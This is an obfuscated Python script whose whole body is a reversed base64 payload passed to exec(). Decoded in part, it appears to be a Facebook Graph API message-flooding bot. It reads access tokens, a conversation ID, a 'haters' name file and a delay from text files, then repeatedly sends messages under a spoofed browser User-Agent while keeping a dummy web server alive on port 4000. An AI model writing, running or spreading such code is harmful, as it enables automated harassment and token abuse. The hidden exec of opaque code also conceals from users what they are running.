# Obfuscated with PyObfuscate
# https://www.github.com/NILAM-RAI
# Time : Mon Sep  2 10:33:03 2024
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'KkCKulWYtBCIgACIgogOn81XulWYt91XnASP9AyXfVWbh52XfBiZppgCpgSZslmZf12byZ2XzV2ZhN3cl12Xk5WZzBCIgACIgoAcv9GbgcmbpRmblNHIldWYzNXZtBSZoRHIoRXa3BSZ15Wa052bjBCLuVGaUByIgACIgACIKogCz5WZr9GdgwGbhByZul2c1BCRJBCZllmZpNWZwNHIlhGdg8GdgU2ZhN3cl1GIsFWa0lmbpBSZoRHIk5WZTByIgACIgACIKoQKoQnchR3cuQWYlJHa09lclZnclNHIgACIgAiCpIXZ2JXZz9VZ0V3YlhXZ9QXZnJXY0hCZhVmcoRlLn5WakFWZyhGdg0DIkFWZyhGdfJXZ2JXZzBCIgACIgogOpgibpFWbgYWZkpgCpkSZoQXYtJ3bm5iI9tHI6QWZyJXdjN2bgI3byJXZg4WQg0VIbJCK05WayBHIgACIgACIgACIgACIgogOlBychBibvlGdwV2Y4VEI0BXZjhXZgACIgACIgACIgoQKi4GXu4iLzNXZj9mcwBSZoRHIn5Wa0JXY0NXZSBiL05WZzBycldWYzNXZtBCbsFEIdtyWuxlIoQnbpJHcgACIgACIgACIgACIgAiCKkCZlVGczhCclVGbz5SZtlGdgACIgACIgACIgACIgACIgACIKkCKzNXZulGbgACIgACIgACIgACIgACIgACIgACIgoQKoM3cl5WasBCIgACIgACIgACIgACIgACIgACIgAiCpkSZnF2czVWbgsCInAyJgsCIl1WYu91cyVGdhhGIsEDIrACelRmbp9lblt2b0BCLkl2XvZnbvNGIsEDIrACelRmbp9VZnF2czVWbgACIgACIgACIgACIgACIgACIgACIgACIgAiCoQXYtJ3bm5iI9tHI603eg4WZr9GVggGdpdHI9tHIvZnbvNEIm9GI9tHIldWYzNXZNBCZuV2cg8GdgQWZslWYGBSX4tVb1MzOxs1MzADXigCdulmcwBCIgACIgACIgACIgACIgACIgACIgAiC6U2csVGIgACIgACIgACIgACIgACIgAiCpgyczVmbpxGIgACIgACIgACIgACIgACIgACIgACIKkCKzNXZulGbgACIgACIgACIgACIgACIgACIgACIgoQKpU2ZhN3cl1GIrAyJgcCIrASZtFmbfNnclRXYoBCLxAyKggXZk5Waf5WZr9GdgwCZp91b252bjBCLxAyKggXZk5WafV2ZhN3cl1GIgACIgACIgACIgACIgACIgACIgACIgACIgoAK0FWby9mZuISf7BiO9tHIuV2avRFI9tHIvZnbvNEIm9GI9tHIldWYzNXYNByZulmbuVnUg01kcK+WtZzM7EzWzMDMcJCK05WayBHIgACIgACIgACIgACIgACIgACIgACIKozav5SZz52bwNXZyBiZpBCIgACIgACIgACIgACIgACIgoQKiAXJgMVJ60UJ6kUJgQWJt0WJtkVJg4TP9ACdwV2YjFUbykzOxs1MzADXigSZtlGdmJHdz5SZtlGdg0DIl1Wa09FduVmcyV3YgACIgACIgACIgACIgACIgACIKoQKzJXZkFWZo1zcyVGZhVGagwycyVGdl1WYyFGc942bzpGIswmc1hCdz9GcuMHdzVWdxVmcg0DIlNnbvB3clJHIgACIgACIgACIgACIgACIgAiC9V2ZhN3cl1GIrAyJgcCIrASZtFmbfNnclRXYoBiOnU2ZhN3cl12Jgwiblt2b091czV2YjFGI6ciblt2b091czV2YjF2J7BSPgMnclRXZtFmchBHIgACIgACIgACIgACIgACIgAiCpQWaf9mdu92YgsCIn8FdngCdh1mcvZmLi8Sf79CMucTM29SbvNmLr92biV2YhZmLoBXYyd2LvozcwRHdoJCI9ACbyVHIgACIgACIgACIgACIgACIgAiCKkCKwlmc0NnLdhXZk5WafV2ZhN3cl12WzV2ZhN3cl1GI9ASZnF2czVWbgACIgACIgACIgACIgACIgACIKoQKoAXayR3cu0FelRmbp9lblt2b0t1cuV2avRHI9Aiblt2b091czV2YjFGIgACIgACIgACIgACIgACIgAiCz5WZr9GdfhXYtBSJggXZk5WafV2ZhN3cl1GI9ACelRmbp9lblt2b0BCIgACIgACIgACIgACIgACIgogOpMXZnF2czVWbf1WduhSZn5WYyBibpBCelRmbp9VZnF2czVWbgI3bmBCIgACIgACIgACIgACIKoTeyRHIgACIgACIgACIKoTZ1JHVgUGbph2dgACIgACIKoQfgACIgACIKcSbvNmLlx2Zv92Zuc3d3dCI6ciclJXZmVmcnACIgACIgACIgAiCscCOuATPxtjcmxSOuATPxtjb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wFmcn9yL6MHc0RHaiASPgwmc1BCIgACIgACIgAiCpgCcpJHdz5iblt2b0BSPg4WZr9GdfN3clN2YhBCIgACIgACIgAiC6Mnblt2b0BibpBiblt2b0BicvZGIgACIgAiCK0HIgACIgAiCn02bj5SZsd2bvdmL3d3dnAiOnIXZyVmZlJ3JgACIgACIgACIgoALngjLw0Tc7InZskjLw0Tc74WZsMVVt4WZnAiOnU2ZhV3ZuFGTtQHclN2YBdCIgACIgACIgACIKwyJlRXYsZWZkBCLwlmendCI6cyZulGZvNmbF1CdwV2YjF0JgACIgACIgACIgoALngjLw0Tc7oyLqwyZuBXYvU2Zh1WasAnYld3LldWYtlGL54CM9E3Os1Gev42bpRXYjlGbwBXYswWb4tCbtRHa49ibvlGdhNWasBHchxCbtRHavQHelR3JgozJ0BXZjNWQnACIgACIgACIgAiCsciNz4yNzUzLpJXYmF2UgUGbpJ2bNBSNyEjL5IDMz4CMugTNvUWbvJHaDBSKvt2YldEIltWasBCLM1EVItEKgYzMuczM18CdptkYldVZsBHcBBSK2dHI7cTMw4yMyYDM3EjL2IFUP9CZslWdCBSOTBSe4FGbhdEIn5Wdz1WYTByOw4CMugDIkl2byRmbBByO4VnbpxEKgAjL18SYsxWa69WTnAiOnQnbldWQtIXZzV1JgACIgACIgACIgoALnEzJgozJzR3clVXclJVLlJXdjV2culULlRWYydGcVdCIgACIgACIgACIKwyJw0TZnFWL4FWbnAiOnw2byRnbvNULlh2YhN0JgACIgACIgACIgoALnUmdpxWYtAXZlt2JgozJu9Wa0NWZu52bDdCIgACIgACIgACIKsHI9AycyVGZhVGagACIgACIKoQKn84liDZliDZliDZliDZliDZliDZliDZliDZliDZliDZliDZliDZlinUQS1STBxUSOBZliDZliDZliDZliDZliDZliDZliDZliDZliDZliDZliDZli/4lifCIrAyJtJTO7EzWzMDMcdCK05WayBHIgACIgACIgACIKoTKoM3cl5WasBiZlRGIgACIgAiCKkCKzdmbp5mchd3XlxmYhNXak5yMilGbsJXduMXZnF2ajFGcuMHdzVWdxVmcgACIgACIKogI4QTNxYDMzETN1YTNxYjIg0DIkl2X0V2ZyFGdgACIgACIKU2ZhN3cl1GIlhGdgQmblNHIvRHI05WY3BSdvlHIlJXZodHIElEIlhGdgknZpNWZwNFIjACIgACIgogCi03eg0iOgMXag4WZr9GdgkXTg4iclZnclNHIyV3b5ByZul2c1BSbhBSSg4icpNHIOFUQChUQTBybsxWZIBCIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIg4UQBJESBNFI+0DIyVmb39EIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIJFkUg0UQMlkTgklQgM1SDlkUUBSL6ACVJRURSNkIg0DIlRXYsBXblR3XnNXbgACIgACIKQnbl1WZylWdxVmcgIXdvlHIyVGcgMXYgU2ZhN3cl1GIlhGdgknZpR2bNByIgACIgACIKoQKoMXZulGbkFWZy5SZslmZg0DIz5WZr9GdgACIgACIgACIgogOlxWamBychBSKnI3JgwyJ0hHdu4URL9EVtIlTngiblB3bggGdpdHIgACIgAiC6kCKldWYzNXZt9FbhlGdp5WafRmblNHImVGZKogCpgiclZXZy9mZfVmdyV2cuQGc0RHagACIgACIgACIgoQKpQlUPBFK0FWby9mZuISf7pDdz9GasF2Yvx2LvoDc0RHagQXYgcmbp5mb1JHIyVmdyV2UigCdulmcwBCIgACIgACIgAiC6QGc0RHagMXYgkiclxGZuFGS51EIskCVS9EUgwiIigCKyVmdyV2UQNEVuIXZ2JXZzRXZrN2bzBCa0l2dgACIgACIKADMwQDI9ACVS9EUgACIgACIKoTKoIXZ2JXZz9VZ0V3YlhXZgYWZkpQKikUQSBSTBxUSOBSWCByULNUSSRFItoDIUlERFJ1QiIGKlRXaydnLlxWamdnLmxWZzBCIgACIgACIgAiCpgycyVGZhVGafRmbl5iZsV2cgACIgACIgACIgoQKn4WahxGcvQHelR3JgwyJlBXe01CduVGdu92QngiclRWYlh2Xk5WZz5iZsV2cgACIgACIgACIgoQKwAjMoU2cu9GczVmcfRmblNnLmxWZzBCIgACIgACIgAiC6kiZsV2coQVRH91bkBiZlRGIgACIgAiC6kiclxGZuFGS0NXZ1FXZSBFVUhUZsBXbpNlLyVmdyV2cuAHd0hGKyVGbk5WYIlXTgM3chx2YK02bk5WYyBCdy9GctlmCn5WakFWZyhGdgQncvBXbppgclZnclNHdlt2YvNHI0J3bw1WaKIXZ2JXZz5Cc0RHagQncvBXbppwczV2YvJHciV3cgQncvBXbppwcvBCdy9GctlmCtVGdzl3cgQncvBXbpBSby9mZ0FGbwBSbvJnZKMXezBCdy9GctlmCl1Wa0BCdy9GctlmCu92cqBCdy9GctlmCzR3clVXclJHI0J3bw1Wa'))
